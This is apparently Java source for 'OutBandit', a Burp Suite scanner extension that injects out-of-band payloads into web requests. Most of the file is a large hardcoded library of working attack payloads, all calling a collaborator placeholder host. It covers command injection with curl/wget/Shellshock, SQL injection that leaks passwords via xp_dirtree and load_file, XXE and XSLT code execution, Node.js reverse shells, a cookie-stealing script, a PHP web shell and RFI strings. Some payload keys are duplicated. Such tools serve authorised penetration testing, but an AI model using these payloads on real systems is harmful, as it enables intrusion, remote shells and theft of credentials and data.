package burp;

import java.awt.Color;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;
//import java.util.stream.Collectors;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.SwingUtilities;
import javax.swing.border.Border;
import javax.swing.border.EmptyBorder;
import javax.swing.table.AbstractTableModel;
import javax.swing.text.BadLocationException;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;


public class BurpExtender implements IBurpExtender, IScannerCheck, ITab  {
	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;
	private JPanel panel1;
	private JPanel panel2;
	private JPanel panel3;
	private JTabbedPane tabbedPane;
	private String User_Listener_Interface = "";
	private String _1_attack_type_payloadg = "";
	private String _2_User_input_payloadg = "";
	private String _3_target_os_payloadg= "";
	private String _4_attack_method_payloadg= "";
	private String _5_target_technology_payloadg= "";
	private String _6_ip_or_domain_payloadg = "";
	private HashMap<Integer, byte[]> Logger_Muzzy_Req = new HashMap<Integer, byte[]>();
	private HashMap<Integer, String> Logger_Muzzy_Info = new HashMap<Integer, String>();
	private int MuzzyRN = 786; 
	
	@Override
	public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
		this.callbacks = callbacks;
		this.helpers = callbacks.getHelpers();
		this.callbacks.setExtensionName("OutBandit");
		PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
		stdout.println("Extension Loaded Successfully. :)"
				+ "\n\nDeveloped by Muzkkir Husseni \nhttps://muzkkir.com"
				+ "\n\nSpecial Thanks to Rohit Misuriya, Nachiket Rathod & Khushal Suthar for inspiration");
		
		this.callbacks.registerScannerCheck(this);
//		Upcoming Feature
//		this.callbacks.registerContextMenuFactory(new Menu(callbacks));
		
		SwingUtilities.invokeLater(new Runnable() {
			
			@Override
			public void run() {
				
				// Create panel for all views
				panel1 = new JPanel();
				GroupLayout layout1 = new GroupLayout(panel1);
				panel1.setLayout(layout1);
				load_layout_1(layout1);

				panel2 = new JPanel();
				GroupLayout layout2 = new GroupLayout(panel2);
				panel2.setLayout(layout2);
				load_layout_2(layout2);
				
				panel3 = new JPanel();
				GroupLayout layout3 = new GroupLayout(panel3);
				panel3.setLayout(layout3);
				load_layout_3(layout3);
				
				tabbedPane = new JTabbedPane();
		        tabbedPane.addTab(" Settings ", null, panel1, null);
		        tabbedPane.addTab(" Search Payload ", null, panel2, null);
		        tabbedPane.addTab(" About ", null, panel3, null);	
				callbacks.customizeUiComponent(tabbedPane);
				callbacks.addSuiteTab(BurpExtender.this);
			}
		});		
	}
	

	@Override
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
		return null;
	}

	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
			IScannerInsertionPoint insertionPoint) {
		PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
		
		if (User_Listener_Interface.isEmpty()) {
			this.callbacks.issueAlert("Please set User Interface for OOB Attack");
			return null;
		}
		else {
		}
		
		try {			
			 HashMap<String, String> RawPayloads = new HashMap<String, String>();			 
			 RawPayloads = PayloadGenerator(_1_attack_type_payloadg, _2_User_input_payloadg, _3_target_os_payloadg, _4_attack_method_payloadg, _5_target_technology_payloadg, _6_ip_or_domain_payloadg);			 
			 for(int i=0;i<=Integer.valueOf(RawPayloads.size())-1;i++){ 
				 Object firstKey = RawPayloads.keySet().toArray()[i];
				 Object valueForFirstKey = RawPayloads.get(firstKey);
				 MuzzyRN += 1;
				 valueForFirstKey = valueForFirstKey.toString().toLowerCase().replace("MuzzyRN".toLowerCase(), ""+MuzzyRN);
				 byte[] withPayload = insertionPoint.buildRequest(valueForFirstKey.toString().getBytes());
				 IHttpRequestResponse newReqRes = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), withPayload);
				 String Description ="" + MuzzyRN       +
						 "muzzy-change-me" +baseRequestResponse.getUrl()+
						 "muzzy-change-me"+baseRequestResponse.getHost() +
						 "muzzy-change-me"+baseRequestResponse.getPort() +
						 "muzzy-change-me"+insertionPoint.getInsertionPointName().toString() +
						 "muzzy-change-me"+valueForFirstKey+
						 "muzzy-change-me"+firstKey +
					"muzzy-change-me"+this.helpers.analyzeResponse(newReqRes.getResponse()).getStatusCode();
				 Logger_Muzzy_Info.put(MuzzyRN, Description);
				 Logger_Muzzy_Req.put(MuzzyRN, withPayload);
			 }  
			}
			catch(Exception e) {
			}
		return null;
	}

	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
		return 0;
	}

	@Override
	public String getTabCaption() {
		return "OutBandit";
	}

	@Override
	public Component getUiComponent() {
		return this.tabbedPane;
	}

	 public HashMap<String,String> PayloadGenerator(String attack_type_1, String user_input_2, String target_os_3, String attack_method_4, String target_technology_5, String ip_or_domain_6) {
		 PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
			
			String payload_details_Attack_CI = "Command Injection Attack";
			String payload_details_Attack_XXE = "XML External Entity Attack";
			String payload_details_Attack_SQLI = "SQL Injection Attack";
			String payload_details_Attack_SSJI = "Server Side JavaScript Injection Attack";
			String payload_details_Attack_SSI = "Server Side Includes Attack";
			String payload_details_Attack_SSTI = "Server Side Template Injection Attack";
			String payload_details_Attack_RFI = "Remote File Inclusion Attack";
			String payload_details_Attack_OR = "Open Redirection Attack";
			String payload_details_Attack_SMTP = "Simple Mail Transfer Protocol Attack";
			String payload_details_Attack_CodeI = "Code Injection Attack";
			String payload_details_Attack_Deser = "Deserialization Attack";
			String payload_details_Attack_ELI = "Expression Language Injection Attack";

			String payload_details_Technology_All = "ALL Technology";
			String payload_details_Technology_PHP = "PHP Technology";
			String payload_details_Technology_JAVA = "Java Technology";
			String payload_details_Technology_Python = "Python Technology";
			String payload_details_Technology_dotnet = ".Net Technology";
			String payload_details_Technology_Node = "NodeJs Technology";

			String payload_details_OS_All = "Linux and Windows" ;
			String payload_details_OS_Windows = "Windows" ;
			String payload_details_OS_Linux = "Linux" ;
			
			String payload_details_oob_Muzzy_All = "Muzzy_Colaborator_All";
			String payload_details_oob_Muzzy_IP = "Muzzy_Colaborator_IP";
			String payload_details_oob_Muzzy_Domain = "Muzzy_Colaborator_Domain";
			
			String payload_details_Scope_All = "ALL Intranet and Internet Network";
			String payload_details_Scope_Intranet = "Intranet Network Local";
			String payload_details_Scope_Internet = "Internet Network Global";
				
			String payload_details_HTTP_Hit = "HTTP and DNS Hit";
			String payload_details_DNS_Hit = "DNS Hit";
			
				 HashMap<String, String> RawPayloads = new HashMap<String, String>();
				 HashMap<String, String> Return_Payload_list = new HashMap<String, String>();
				 //
				 // Command Injection 
				 //
				 RawPayloads.put("101. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "&& curl http://Muzzy_Colaborator_All/MuzzyRN.txt");
				 RawPayloads.put("102. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_Windows+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit, "%0a ping -i 30 MuzzyRN.Muzzy_Colaborator_All %0a");
				 RawPayloads.put("103. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_Linux+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "() { :;}; /bin/bash -c \"curl http://Muzzy_Colaborator_All/MuzzyRN.txt\"");
				 RawPayloads.put("104. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1 |nslookup -q=cname MuzzyRN.Muzzy_Colaborator_All&");
				 RawPayloads.put("105. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"%2 -n 21 muzzyRN.Muzzy_Colaborator_All||`ping -c 21 muzzyRN.Muzzy_Colaborator_All` #' |ping -n 21 muzzyRN.Muzzy_Colaborator_All||`ping -c muzzyRN.Muzzy_Colaborator_All` #\\\" |ping -n 21 muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("105. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"() { :;}; curl http://Muzzy_Colaborator_All/muzzyRN.txt");
				 RawPayloads.put("106. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"$(`curl https://Muzzy_Colaborator_All/muzzyRN.txt`)");
				 RawPayloads.put("107. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"\\n\\033[2wget http://Muzzy_Colaborator_All/muzzyRN.txt?ci=2?user=\\`whoami\\`");
				 RawPayloads.put("108. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"; wget http://Muzzy_Colaborator_All/muzzyRN;");
				 RawPayloads.put("109. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"; nslookup muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("110. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"8.8.8.8; dig muzzyRN.Muzzy_Colaborator_All");
				 RawPayloads.put("111. "+payload_details_Attack_CI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"|| ping -c 10 Muzzy_Colaborator_All");
//
//				 // SQL Injection
//				 
				 RawPayloads.put("201. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "' union select null,null, null, load_file(concat('\\\\\\\\', database(),'.Muzzy_Colaborator_All\\\\MuzzyRN.txt')),null,null-- -");
				 RawPayloads.put("202. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,";declare @q varchar(99);set @q='\\\\Muzzy_Colaborator_All\\MuzzyRN'; exec master.dbo.xp_dirtree @q;-- ");				 
				 RawPayloads.put("203. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"' into outfile '\\\\\\\\Muzzy_Colaborator_All\\\\MuzzyRN'; -- ");
				 RawPayloads.put("204. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"(select load_file('\\\\\\\\Muzzy_Colaborator_All\\\\muzzyRN'))");
				 RawPayloads.put("205. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"'+(select load_file('\\\\\\\\Muzzy_Colaborator_All\\\\muzzyRN'))+'");
				 RawPayloads.put("206. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"EXEC master.dbo.xp_cmdshell 'ping muzzyRN.Muzzy_Colaborator_All';");
				 RawPayloads.put("207. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1'; use master; exec xp_dirtree '\\\\Muzzy_Colaborator_All\\muzzyRN';-- ");
				 RawPayloads.put("208. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.muzzyRN.Muzzy_Colaborator_All\\sqli.xem',null,null))");
				 RawPayloads.put("209. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.muzzyRN.Muzzy_Colaborator_All\\',default,default)))");
				 RawPayloads.put("210. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.muzzyRN.Muzzy_Colaborator_All\\sqli.trc',default))");
				 RawPayloads.put("211. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1||Utl_Http.request('http://Muzzy_Colaborator_All/muzzyRN') from dual--");
				 RawPayloads.put("212. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1||UTL_HTTP.request('http://Muzzy_Colaborator_All/muzzyRN'||(SELECT user FROM DUAL)) --");
				 RawPayloads.put("213. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1' union select 1,2,3,load_file(concat('\\\\\\\\','Muzzy_Colaborator_All\\\\muzzyRN.txt')),5,6,7-- -");
				 RawPayloads.put("214. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1 union+select+1,2,3,load_file(concat('\\\\\\\\','Muzzy_Colaborator_All\\\\muzzyRN.txt'))--+-");
				 RawPayloads.put("215. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,";EXEC master..xp_dirtree '\\\\muzzyRN.Muzzy_Colaborator_All\\' -- ");
				 RawPayloads.put("216. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1; DECLARE @host varchar(1024); SELECT @host='test.'+(SELECT user_name())+'.muzzyRN.Muzzy_Colaborator_All'; EXEC('master..xp_dirtree \"\\\\'+@host+'\\test\"')--");
				 RawPayloads.put("217. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_PHP+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"' union select 1, '<?php system(\"ping Muzzy_Colaborator_All\"); ?>' into outfile '/tmp/cmd.php' #");
				 RawPayloads.put("218. "+payload_details_Attack_SQLI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"-1 UNION SELECT 4,'Muzzy_Colaborator_All',32 from user where id=1 limit 1 -- ");
//				 
//				 // XML External Entity
//				 
				 RawPayloads.put("301. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM \"http://Muzzy_Colaborator_All/MuzzyRN.txt\"> ]> <r>&sp;</r>");
				 RawPayloads.put("302. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"<?xml+version=\"1.0\"+encoding=\"ISO-8859-1\"?><!DOCTYPE+foo [<!ELEMENT+foo+ANY><!ENTITY+xxe+SYSTEM \"http://Muzzy_Colaborator_All/MuzzyRN.txt\">]><foo>&xxe;</foo>");
				 RawPayloads.put("303. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "<?xml version=\"1.0\"?> <!DOCTYPE data SYSTEM \"http://Muzzy_Colaborator_All/MuzzyRN.txt\" [ <!ELEMENT data (#ANY)> ]> <data>4</data>");
				 RawPayloads.put("304. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "* and doc('//Muzzy_Colaborator_All/muzzyRN.txt')");
				 RawPayloads.put("305. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "<?xml version=\"1.0\" encoding=\"utf-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/fruits\"> <xsl:copy-of select=\"document('http://Muzzy_Colaborator_All/muzzyRN.txt')\"/> <xsl:copy-of select=\"document('/etc/passwd')\"/> <xsl:copy-of select=\"document('file:///c:/winnt/win.ini')\"/> Fruits: <!-- Loop for each fruit --> <xsl:for-each select=\"fruit\"> <!-- Print name: description --> - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/> </xsl:for-each> </xsl:template> </xsl:stylesheet>");
				 RawPayloads.put("306. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"urn:my-scripts\"> <msxsl:script language = \"C#\" implements-prefix = \"user\"> <![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\"; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = \"ping muzzyRN.Muzzy_Colaborator_All\"; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); }]]> </msxsl:script> <xsl:template match=\"/fruits\"> --- BEGIN COMMAND OUTPUT --- <xsl:value-of select=\"user:execute()\"/> --- END COMMAND OUTPUT --- </xsl:template> </xsl:stylesheet>");
				 RawPayloads.put("307. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://Muzzy_Colaborator_All/muzzyRN.txt\"><xss:xss>Muzzy</xss:xss></HTML>");
				 RawPayloads.put("308. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://Muzzy_Colaborator_All/muzzyRN.dtd\">%xxe;]><foo>&xxe;</foo>");
				 RawPayloads.put("309. "+payload_details_Attack_XXE+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit, "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE header [<!ENTITY % dtd SYSTEM \"http://Muzzy_Colaborator_All/muzzyRN.dtd\" > %dtd; ]> <OutBandit>&xxe;</OutBandit>");
//				 
//				 // Server Side JavaScript Injection
//				 
				 RawPayloads.put("401. "+payload_details_Attack_SSJI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_Linux+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1;(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(80, \"Muzzy_Colaborator_All\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();");
				 RawPayloads.put("402. "+payload_details_Attack_SSJI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_Linux+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1;(function(){ const https = require('https'); https.get('https://Muzzy_Colaborator_All/muzzyRN.txt', res => { let data = []; const headerDate = res.headers && res.headers.date ? res.headers.date : 'no response date'; console.log('Status Code:', res.statusCode); console.log('Date in Response header:', headerDate); res.on('data', chunk => { data.push(chunk); }); })();");
				 RawPayloads.put("403. "+payload_details_Attack_SSJI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_Linux+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"tls\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; var counter = 0; function StagerRepeat() { client.socket = net.connect(12347, \"Muzzy_Colaborator_All\", { rejectUnauthorized: false }, function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \"undefined\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on(\"error\", function(error) { counter++; if (counter <= 10) { setTimeout(function() { StagerRepeat(); }, 5 * 1000); } else process.exit(); }); } StagerRepeat(); })();");
				 RawPayloads.put("404. "+payload_details_Attack_SSJI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_Linux+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1; {{config.__proto__.prototype.constructor('console.log(require(\"child_process\").execSync(\"curl https://Muzzy_Colaborator_All/muzzyRN.txt\").toString()))()}}");
				 RawPayloads.put("405. "+payload_details_Attack_SSJI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1; {{#each this}}{{#with \"x\"}} {{#with \"constructor\"}} {{#with \"return this.process.mainModule.require('child_process').execSync('curl https://Muzzy_Colaborator_All/muzzyRN.txt').toString()\"}} {{#with (this.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.x.y.z)}} {{this.[[functionBody]].slice(0,-1)}} {{/with}} {{/with}} {{/with}} {{/with}} {{/each}}");
				 RawPayloads.put("406. "+payload_details_Attack_SSJI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"1;{{~req~uire('child_process').exec('ping muzzyRN.Muzzy_Colaborator_All',function(error,stdout,stderr){res.send(stdout)})}}");
				 RawPayloads.put("407. "+payload_details_Attack_SSJI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"1; {{ [].__proto__.constructor('console.log(require(\"child_process\").execSync(\"curl https://Muzzy_Colaborator_All/muzzyRN.txt\").toString()))() }}");
//				 
//				 // Server Side Includes
//				 
				 RawPayloads.put("501. "+payload_details_Attack_SSI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit," <!--#exec cmd=\"wget http://Muzzy_Colaborator_All/muzzyRN.txt\" -->");
				 RawPayloads.put("502. "+payload_details_Attack_SSI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"<! -- #exec cmd=”nc Muzzy_Colaborator_All 80 ” -- >");
				 RawPayloads.put("503. "+payload_details_Attack_SSI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit," <!--#exec cmd=\"curl http://Muzzy_Colaborator_All/muzzyRN.txt\" -->");
				 RawPayloads.put("504. "+payload_details_Attack_SSI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"<!--#config errmsg=\"<h1>Internal Server Error</h1><script>new Image().src='http://Muzzy_Colaborator_All/muzzyRN.txt?'+document.cookie;</script>\" -->");
				 RawPayloads.put("505. "+payload_details_Attack_SSI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit," <!--#exec cmd=\"ping muzzyRN.Muzzy_Colaborator_All\" -->");
//				 
//				 // Server Side Template Injection
//				 
				 RawPayloads.put("601. "+payload_details_Attack_SSTI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"<% import os x=os.popen('curl muzzyRN.Muzzy_Colaborator_All').read() %> ${x}");
				 RawPayloads.put("602. "+payload_details_Attack_SSTI+", "+payload_details_Scope_All+", "+payload_details_Technology_Python+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"{php}echo `curl muzzyRN.Muzzy_Colaborator_All`;{/php}");
				 RawPayloads.put("603. "+payload_details_Attack_SSTI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"curl muzzyRN.Muzzy_Colaborator_All\") }");
				 RawPayloads.put("604. "+payload_details_Attack_SSTI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"#set($str=$class.inspect(\"java.lang.String\").type) #set($chr=$class.inspect(\"java.lang.Character\").type) #set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"curl muzzyRN.Muzzy_Colaborator_All\")) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end");
				 RawPayloads.put("605. "+payload_details_Attack_SSTI+", "+payload_details_Scope_All+", "+payload_details_Technology_All+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_DNS_Hit,"{{['ping muzzyRN.Muzzy_Colaborator_All']|filter('system')}}");
//				 
//				 // Remote File Inclusion
//				 
				 RawPayloads.put("701. "+payload_details_Attack_RFI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"http://Muzzy_Colaborator_All/muzzyRN.phphttp://Muzzy_Colaborator_All/muzzyRN.php?page=\\\\Muzzy_Colaborator_All\\shared\\muzzyRN.php");
				 RawPayloads.put("701. "+payload_details_Attack_RFI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"php://filter/read=string.rot13/resource=index.phphttp://Muzzy_Colaborator_All/muzzyRN.php?page=php://filter/convert.base64-encode/resource=muzzyRN.phphttp://Muzzy_Colaborator_All/index.php?page=pHp://FilTer/convert.base64-encode/resource=muzzyRN.php");
				 RawPayloads.put("701. "+payload_details_Attack_RFI+", "+payload_details_Scope_All+", "+payload_details_Technology_JAVA+", "+payload_details_OS_All+", "+payload_details_oob_Muzzy_All+", "+payload_details_HTTP_Hit,"https://Muzzy_Colaborator_All/muzzyRN.php.php");
